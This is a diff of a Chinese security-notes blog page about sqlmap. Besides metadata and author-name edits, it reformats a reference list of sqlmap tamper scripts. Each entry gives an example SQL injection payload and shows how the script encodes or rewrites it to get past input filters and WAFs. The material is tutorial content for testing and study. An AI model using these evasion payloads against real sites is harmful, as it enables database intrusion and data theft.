@@ -4,22 +4,24 @@
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
-        <title>Sqlmap-SQL注入漏洞 - Eccentric&#39;s Note</title><meta name="Description" content="本站主要用来收集整理资料、记录笔记，方便自己查询使用。"><meta property="og:title" content="Sqlmap-SQL注入漏洞" />
-<meta property="og:description" content="" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://hubu8.github.io/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="https://hubu8.github.io/logo.png"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2025-05-27T13:59:26+08:00" />
-<meta property="article:modified_time" content="2025-05-27T13:59:26+08:00" /><meta property="og:site_name" content="My cool site" />
+        <title>Sqlmap-SQL注入漏洞 - Eccentric&#39;s Note</title><meta name="Description" content="本站主要用来收集整理资料、记录笔记，方便自己查询使用。"><meta property="og:url" content="https://hubu8.github.io/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+  <meta property="og:site_name" content="Eccentric&#39;s Note">
+  <meta property="og:title" content="Sqlmap-SQL注入漏洞">
+  <meta property="og:description" content="本站主要用来收集整理资料、记录笔记，方便自己查询使用。">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-27T13:59:26+08:00">
+    <meta property="article:modified_time" content="2025-05-27T13:59:26+08:00">
+    <meta property="article:tag" content="Kali">
+    <meta property="og:image" content="https://hubu8.github.io/logo.png">
 
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://hubu8.github.io/logo.png"/>
-
-<meta name="twitter:title" content="Sqlmap-SQL注入漏洞"/>
-<meta name="twitter:description" content=""/>
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://hubu8.github.io/logo.png">
+  <meta name="twitter:title" content="Sqlmap-SQL注入漏洞">
+  <meta name="twitter:description" content="本站主要用来收集整理资料、记录笔记，方便自己查询使用。">
 <meta name="application-name" content="Eccentric&#39;s Note">
-<meta name="apple-mobile-web-app-title" content="Eccentric&#39;s Note">
-
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/header_images/favicon-32x32.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hubu8.github.io/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="https://hubu8.github.io/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/" /><link rel="next" href="https://hubu8.github.io/posts/csrf-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<meta name="apple-mobile-web-app-title" content="Eccentric&#39;s Note"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/header_images/favicon-32x32.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hubu8.github.io/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="https://hubu8.github.io/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/" /><link rel="next" href="https://hubu8.github.io/posts/csrf-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
@@ -35,7 +37,7 @@
             "@type": "Organization",
             "name": ""},"author": {
                 "@type": "Person",
-                "name": "Eccentric"
+                "name": "xxxx"
             },"description": ""
     }
     </script></head>
@@ -60,8 +62,7 @@
                         </span>
                     </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                     <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
-                </a>
-            </div>
+                </a></div>
         </div>
     </div>
 </header><header class="mobile" id="header-mobile">
@@ -104,7 +105,7 @@
             <h2 class="toc-title">目录</h2>
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Sqlmap-SQL注入漏洞</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/hubu8" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Eccentric</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>网络安全</a></span></div>
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>xxxx</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>网络安全</a></span></div>
             <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-05-27">2025-05-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 10533 字&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 22 分钟&nbsp;<span id="/posts/sqlmap-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="leancloud_visitors" data-flag-title="Sqlmap-SQL注入漏洞">
                         <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
@@ -873,233 +874,233 @@ sqlmap 使用的 payloads 直接从文本文件 xml/payloads.xml 中载入。</p
 </span><span class="lnt">227
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">apostrophemask.py
-</span></span><span class="line"><span class="cl">功能：对引号进行 utf-8 格式编码 (% EF% BC%87)
-</span></span><span class="line"><span class="cl">平台：All
-</span></span><span class="line"><span class="cl">举例：1 AND ‘1’=’1 ==&gt; 1 AND % EF% BC%871% EF% BC%87=% EF% BC%871
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">apostrophemask</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：对引号进行</span> <span class="n">utf</span><span class="o">-</span><span class="mi">8</span> <span class="err">格式编码</span> <span class="p">(</span><span class="o">%</span> <span class="n">EF</span><span class="o">%</span> <span class="n">BC</span><span class="o">%</span><span class="mi">87</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="mi">1</span> <span class="n">AND</span> <span class="err">‘</span><span class="mi">1</span><span class="err">’</span><span class="o">=</span><span class="err">’</span><span class="mi">1</span> <span class="o">==&gt;</span> <span class="mi">1</span> <span class="n">AND</span> <span class="o">%</span> <span class="n">EF</span><span class="o">%</span> <span class="n">BC</span><span class="o">%</span><span class="mi">871</span><span class="o">%</span> <span class="n">EF</span><span class="o">%</span> <span class="n">BC</span><span class="o">%</span><span class="mi">87</span><span class="o">=%</span> <span class="n">EF</span><span class="o">%</span> <span class="n">BC</span><span class="o">%</span><span class="mi">871</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">apostrophenullencode.py
-</span></span><span class="line"><span class="cl">功能：用非法的双 unicode 字符 (%00%27) 替换引号字符
-</span></span><span class="line"><span class="cl">平台：All
-</span></span><span class="line"><span class="cl">举例：1 AND ‘1’=’1 ==&gt; 1 AND %00%271%00%27=%00%271
+</span></span><span class="line"><span class="cl"><span class="n">apostrophenullencode</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用非法的双</span> <span class="n">unicode</span> <span class="err">字符</span> <span class="p">(</span><span class="o">%</span><span class="mi">00</span><span class="o">%</span><span class="mi">27</span><span class="p">)</span> <span class="err">替换引号字符</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="mi">1</span> <span class="n">AND</span> <span class="err">‘</span><span class="mi">1</span><span class="err">’</span><span class="o">=</span><span class="err">’</span><span class="mi">1</span> <span class="o">==&gt;</span> <span class="mi">1</span> <span class="n">AND</span> <span class="o">%</span><span class="mi">00</span><span class="o">%</span><span class="mi">271</span><span class="o">%</span><span class="mi">00</span><span class="o">%</span><span class="mi">27</span><span class="o">=%</span><span class="mi">00</span><span class="o">%</span><span class="mi">271</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">appendnullbyte.py
-</span></span><span class="line"><span class="cl">功能：在有效载荷结束位置加载零字节字符编码
-</span></span><span class="line"><span class="cl">平台：Microsoft Access
-</span></span><span class="line"><span class="cl">举例：1 AND 1=1 ==&gt; 1 AND 1=1%00
+</span></span><span class="line"><span class="cl"><span class="n">appendnullbyte</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：在有效载荷结束位置加载零字节字符编码</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Microsoft</span> <span class="n">Access</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="mi">1</span> <span class="n">AND</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="o">==&gt;</span> <span class="mi">1</span> <span class="n">AND</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">00</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">base64encode.py
-</span></span><span class="line"><span class="cl">功能：用 base64 格式进行编码
-</span></span><span class="line"><span class="cl">平台：All
-</span></span><span class="line"><span class="cl">举例：1’ AND SLEEP (5)# ==&gt; MScgQU5EIFNMRUVQKDUpIw==
+</span></span><span class="line"><span class="cl"><span class="n">base64encode</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用</span> <span class="n">base64</span> <span class="err">格式进行编码</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="mi">1</span><span class="err">’</span> <span class="n">AND</span> <span class="n">SLEEP</span> <span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="c1"># ==&gt; MScgQU5EIFNMRUVQKDUpIw==</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">between.py
-</span></span><span class="line"><span class="cl">功能：用 between 替换大于号（&gt;）
-</span></span><span class="line"><span class="cl">平台：Mssql2005、MySQL 4/5.0/5.5、Oracle 10g、PostgreSQL 8.3/8.4/9.0
-</span></span><span class="line"><span class="cl">举例：
-</span></span><span class="line"><span class="cl">1 AND A &gt; B –  ==&gt; 1 AND A NOT BETWEEN 0 AND B  –
-</span></span><span class="line"><span class="cl">1 AND A = B –  ==&gt; 1 AND A BETWEEN B AND B –
+</span></span><span class="line"><span class="cl"><span class="n">between</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用</span> <span class="n">between</span> <span class="err">替换大于号（</span><span class="o">&gt;</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Mssql2005</span><span class="err">、</span><span class="n">MySQL</span> <span class="mi">4</span><span class="o">/</span><span class="mf">5.0</span><span class="o">/</span><span class="mf">5.5</span><span class="err">、</span><span class="n">Oracle</span> <span class="mi">10</span><span class="n">g</span><span class="err">、</span><span class="n">PostgreSQL</span> <span class="mf">8.3</span><span class="o">/</span><span class="mf">8.4</span><span class="o">/</span><span class="mf">9.0</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span> <span class="n">AND</span> <span class="n">A</span> <span class="o">&gt;</span> <span class="n">B</span> <span class="err">–</span>  <span class="o">==&gt;</span> <span class="mi">1</span> <span class="n">AND</span> <span class="n">A</span> <span class="n">NOT</span> <span class="n">BETWEEN</span> <span class="mi">0</span> <span class="n">AND</span> <span class="n">B</span>  <span class="err">–</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span> <span class="n">AND</span> <span class="n">A</span> <span class="o">=</span> <span class="n">B</span> <span class="err">–</span>  <span class="o">==&gt;</span> <span class="mi">1</span> <span class="n">AND</span> <span class="n">A</span> <span class="n">BETWEEN</span> <span class="n">B</span> <span class="n">AND</span> <span class="n">B</span> <span class="err">–</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">bluecoat.py
-</span></span><span class="line"><span class="cl">功能：对 SQL 语句替换空格字符为 (%09)，并替换”=”—&gt;”LIKE”
-</span></span><span class="line"><span class="cl">平台：MySQL 5.1, SGOS
-</span></span><span class="line"><span class="cl">举例：SELECT username FROM users WHERE id = 1 ==&gt; SELECT%09username FROM%09users WHERE%09id LIKE 1
+</span></span><span class="line"><span class="cl"><span class="n">bluecoat</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：对</span> <span class="n">SQL</span> <span class="err">语句替换空格字符为</span> <span class="p">(</span><span class="o">%</span><span class="mi">09</span><span class="p">)</span><span class="err">，并替换”</span><span class="o">=</span><span class="err">”—</span><span class="o">&gt;</span><span class="err">”</span><span class="n">LIKE</span><span class="err">”</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">MySQL</span> <span class="mf">5.1</span><span class="p">,</span> <span class="n">SGOS</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">SELECT</span> <span class="n">username</span> <span class="n">FROM</span> <span class="n">users</span> <span class="n">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">==&gt;</span> <span class="n">SELECT</span><span class="o">%</span><span class="mi">09</span><span class="n">username</span> <span class="n">FROM</span><span class="o">%</span><span class="mi">09</span><span class="n">users</span> <span class="n">WHERE</span><span class="o">%</span><span class="mi">09</span><span class="n">id</span> <span class="n">LIKE</span> <span class="mi">1</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">apostrophemask.py
-</span></span><span class="line"><span class="cl">功能：用 utf-8 格式编码引号 (如：% EF% BC%87)
-</span></span><span class="line"><span class="cl">平台：All
-</span></span><span class="line"><span class="cl">举例：1 AND ‘1’=’1 ==&gt; 1 AND % EF% BC%871% EF% BC%87=% EF% BC%871
+</span></span><span class="line"><span class="cl"><span class="n">apostrophemask</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用</span> <span class="n">utf</span><span class="o">-</span><span class="mi">8</span> <span class="err">格式编码引号</span> <span class="p">(</span><span class="err">如：</span><span class="o">%</span> <span class="n">EF</span><span class="o">%</span> <span class="n">BC</span><span class="o">%</span><span class="mi">87</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="mi">1</span> <span class="n">AND</span> <span class="err">‘</span><span class="mi">1</span><span class="err">’</span><span class="o">=</span><span class="err">’</span><span class="mi">1</span> <span class="o">==&gt;</span> <span class="mi">1</span> <span class="n">AND</span> <span class="o">%</span> <span class="n">EF</span><span class="o">%</span> <span class="n">BC</span><span class="o">%</span><span class="mi">871</span><span class="o">%</span> <span class="n">EF</span><span class="o">%</span> <span class="n">BC</span><span class="o">%</span><span class="mi">87</span><span class="o">=%</span> <span class="n">EF</span><span class="o">%</span> <span class="n">BC</span><span class="o">%</span><span class="mi">871</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">charunicodeencode.py
-</span></span><span class="line"><span class="cl">功能：对字符串进行 Unicode 格式转义编码
-</span></span><span class="line"><span class="cl">平台：Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP/ASP.NET
-</span></span><span class="line"><span class="cl">举例：SELECT FIELD%20FROM TABLE ==&gt; % u0053% u0045% u004C% u0045% u0043% u0054% u0020% u0046% u0049% u0045% u004C% u0044% u0020% u0046% u0052% u004F% u004D% u0020% u0054% u0041% u0042% u004C% u0045
+</span></span><span class="line"><span class="cl"><span class="n">charunicodeencode</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：对字符串进行</span> <span class="n">Unicode</span> <span class="err">格式转义编码</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Mssql</span> <span class="mi">2000</span><span class="p">,</span><span class="mi">2005</span><span class="err">、</span><span class="n">MySQL</span> <span class="mf">5.1</span><span class="o">.</span><span class="mi">56</span><span class="err">、</span><span class="n">PostgreSQL</span> <span class="mf">9.0</span><span class="o">.</span><span class="mi">3</span> <span class="n">ASP</span><span class="o">/</span><span class="n">ASP</span><span class="o">.</span><span class="n">NET</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">SELECT</span> <span class="n">FIELD</span><span class="o">%</span><span class="mi">20</span><span class="n">FROM</span> <span class="n">TABLE</span> <span class="o">==&gt;</span> <span class="o">%</span> <span class="n">u0053</span><span class="o">%</span> <span class="n">u0045</span><span class="o">%</span> <span class="n">u004C</span><span class="o">%</span> <span class="n">u0045</span><span class="o">%</span> <span class="n">u0043</span><span class="o">%</span> <span class="n">u0054</span><span class="o">%</span> <span class="n">u0020</span><span class="o">%</span> <span class="n">u0046</span><span class="o">%</span> <span class="n">u0049</span><span class="o">%</span> <span class="n">u0045</span><span class="o">%</span> <span class="n">u004C</span><span class="o">%</span> <span class="n">u0044</span><span class="o">%</span> <span class="n">u0020</span><span class="o">%</span> <span class="n">u0046</span><span class="o">%</span> <span class="n">u0052</span><span class="o">%</span> <span class="n">u004F</span><span class="o">%</span> <span class="n">u004D</span><span class="o">%</span> <span class="n">u0020</span><span class="o">%</span> <span class="n">u0054</span><span class="o">%</span> <span class="n">u0041</span><span class="o">%</span> <span class="n">u0042</span><span class="o">%</span> <span class="n">u004C</span><span class="o">%</span> <span class="n">u0045</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">charencode.py
-</span></span><span class="line"><span class="cl">功能：采用 url 格式编码 1 次
-</span></span><span class="line"><span class="cl">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
-</span></span><span class="line"><span class="cl">举例：SELECT FIELD FROM%20TABLE ==&gt; %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45
+</span></span><span class="line"><span class="cl"><span class="n">charencode</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：采用</span> <span class="n">url</span> <span class="err">格式编码</span> <span class="mi">1</span> <span class="err">次</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Mssql</span> <span class="mi">2005</span><span class="err">、</span><span class="n">MySQL</span> <span class="mi">4</span><span class="p">,</span> <span class="mf">5.0</span> <span class="ow">and</span> <span class="mf">5.5</span><span class="err">、</span><span class="n">Oracle</span> <span class="mi">10</span><span class="n">g</span><span class="err">、</span><span class="n">PostgreSQL</span> <span class="mf">8.3</span><span class="p">,</span> <span class="mf">8.4</span><span class="p">,</span> <span class="mf">9.0</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">SELECT</span> <span class="n">FIELD</span> <span class="n">FROM</span><span class="o">%</span><span class="mi">20</span><span class="n">TABLE</span> <span class="o">==&gt;</span> <span class="o">%</span><span class="mi">53</span><span class="o">%</span><span class="mi">45</span><span class="o">%</span><span class="mi">4</span><span class="n">C</span><span class="o">%</span><span class="mi">45</span><span class="o">%</span><span class="mi">43</span><span class="o">%</span><span class="mi">54</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">46</span><span class="o">%</span><span class="mi">49</span><span class="o">%</span><span class="mi">45</span><span class="o">%</span><span class="mi">4</span><span class="n">C</span><span class="o">%</span><span class="mi">44</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">46</span><span class="o">%</span><span class="mi">52</span><span class="o">%</span><span class="mi">4</span><span class="n">F</span><span class="o">%</span><span class="mi">4</span><span class="n">D</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">54</span><span class="o">%</span><span class="mi">41</span><span class="o">%</span><span class="mi">42</span><span class="o">%</span><span class="mi">4</span><span class="n">C</span><span class="o">%</span><span class="mi">45</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">chardoubleencode.py
-</span></span><span class="line"><span class="cl">功能：采用 url 格式编码 2 次
-</span></span><span class="line"><span class="cl">平台：All
-</span></span><span class="line"><span class="cl">举例：SELECT FIELD FROM%20TABLE ==&gt; %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545
+</span></span><span class="line"><span class="cl"><span class="n">chardoubleencode</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：采用</span> <span class="n">url</span> <span class="err">格式编码</span> <span class="mi">2</span> <span class="err">次</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">SELECT</span> <span class="n">FIELD</span> <span class="n">FROM</span><span class="o">%</span><span class="mi">20</span><span class="n">TABLE</span> <span class="o">==&gt;</span> <span class="o">%</span><span class="mi">2553</span><span class="o">%</span><span class="mi">2545</span><span class="o">%</span><span class="mi">254</span><span class="n">C</span><span class="o">%</span><span class="mi">2545</span><span class="o">%</span><span class="mi">2543</span><span class="o">%</span><span class="mi">2554</span><span class="o">%</span><span class="mi">2520</span><span class="o">%</span><span class="mi">2546</span><span class="o">%</span><span class="mi">2549</span><span class="o">%</span><span class="mi">2545</span><span class="o">%</span><span class="mi">254</span><span class="n">C</span><span class="o">%</span><span class="mi">2544</span><span class="o">%</span><span class="mi">2520</span><span class="o">%</span><span class="mi">2546</span><span class="o">%</span><span class="mi">2552</span><span class="o">%</span><span class="mi">254</span><span class="n">F</span><span class="o">%</span><span class="mi">254</span><span class="n">D</span><span class="o">%</span><span class="mi">2520</span><span class="o">%</span><span class="mi">2554</span><span class="o">%</span><span class="mi">2541</span><span class="o">%</span><span class="mi">2542</span><span class="o">%</span><span class="mi">254</span><span class="n">C</span><span class="o">%</span><span class="mi">2545</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">commalessmid.py
-</span></span><span class="line"><span class="cl">功能：将 payload 中的逗号用 from 和 for 代替，用于过滤了逗号并且是 3 个参数的情况
-</span></span><span class="line"><span class="cl">平台：MySQL 5.0, 5.5
-</span></span><span class="line"><span class="cl">举例：MID (VERSION (), 1, 1) ==&gt; MID (VERSION () FROM 1 FOR 1)
+</span></span><span class="line"><span class="cl"><span class="n">commalessmid</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：将</span> <span class="n">payload</span> <span class="err">中的逗号用</span> <span class="n">from</span> <span class="err">和</span> <span class="k">for</span> <span class="err">代替，用于过滤了逗号并且是</span> <span class="mi">3</span> <span class="err">个参数的情况</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">MySQL</span> <span class="mf">5.0</span><span class="p">,</span> <span class="mf">5.5</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">MID</span> <span class="p">(</span><span class="n">VERSION</span> <span class="p">(),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==&gt;</span> <span class="n">MID</span> <span class="p">(</span><span class="n">VERSION</span> <span class="p">()</span> <span class="n">FROM</span> <span class="mi">1</span> <span class="n">FOR</span> <span class="mi">1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">concat2concatws.py
-</span></span><span class="line"><span class="cl">功能：CONCAT () ==&gt; CONCAT_WS ()，用于过滤了 CONCAT () 函数的情况
-</span></span><span class="line"><span class="cl">平台： MySQL 5.0
-</span></span><span class="line"><span class="cl">举例：CONCAT (1,2) ==&gt; CONCAT_WS (MID (CHAR (0),0,0),1,2)
+</span></span><span class="line"><span class="cl"><span class="n">concat2concatws</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：</span><span class="n">CONCAT</span> <span class="p">()</span> <span class="o">==&gt;</span> <span class="n">CONCAT_WS</span> <span class="p">()</span><span class="err">，用于过滤了</span> <span class="n">CONCAT</span> <span class="p">()</span> <span class="err">函数的情况</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span> <span class="n">MySQL</span> <span class="mf">5.0</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">CONCAT</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span> <span class="o">==&gt;</span> <span class="n">CONCAT_WS</span> <span class="p">(</span><span class="n">MID</span> <span class="p">(</span><span class="n">CHAR</span> <span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">equaltolike.py
-</span></span><span class="line"><span class="cl">功能：= ==&gt; LIKE，用于过滤了等号”=” 的情况
-</span></span><span class="line"><span class="cl">平台：Mssql 2005、MySQL 4, 5.0 and 5.5
-</span></span><span class="line"><span class="cl">举例：SELECT * FROM users WHERE id=1 ==&gt; SELECT * FROM users WHERE id LIKE 1
+</span></span><span class="line"><span class="cl"><span class="n">equaltolike</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：</span><span class="o">=</span> <span class="o">==&gt;</span> <span class="n">LIKE</span><span class="err">，用于过滤了等号”</span><span class="o">=</span><span class="err">”</span> <span class="err">的情况</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Mssql</span> <span class="mi">2005</span><span class="err">、</span><span class="n">MySQL</span> <span class="mi">4</span><span class="p">,</span> <span class="mf">5.0</span> <span class="ow">and</span> <span class="mf">5.5</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">SELECT</span> <span class="o">*</span> <span class="n">FROM</span> <span class="n">users</span> <span class="n">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="o">==&gt;</span> <span class="n">SELECT</span> <span class="o">*</span> <span class="n">FROM</span> <span class="n">users</span> <span class="n">WHERE</span> <span class="n">id</span> <span class="n">LIKE</span> <span class="mi">1</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">greatest.py
-</span></span><span class="line"><span class="cl">功能：&gt; ==&gt; GREATEST
-</span></span><span class="line"><span class="cl">平台：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
-</span></span><span class="line"><span class="cl">举例：1 AND A &gt; B ==&gt; 1 AND GREATEST (A, B+1)=A
-</span></span><span class="line"><span class="cl">a 和 b+1 比较，取两者中的最大值为 a；则 a &gt;= b+1，亦即 a &gt; b
+</span></span><span class="line"><span class="cl"><span class="n">greatest</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：</span><span class="o">&gt;</span> <span class="o">==&gt;</span> <span class="n">GREATEST</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">MySQL</span> <span class="mi">4</span><span class="p">,</span> <span class="mf">5.0</span> <span class="ow">and</span> <span class="mf">5.5</span><span class="err">、</span><span class="n">Oracle</span> <span class="mi">10</span><span class="n">g</span><span class="err">、</span><span class="n">PostgreSQL</span> <span class="mf">8.3</span><span class="p">,</span> <span class="mf">8.4</span><span class="p">,</span> <span class="mf">9.0</span>
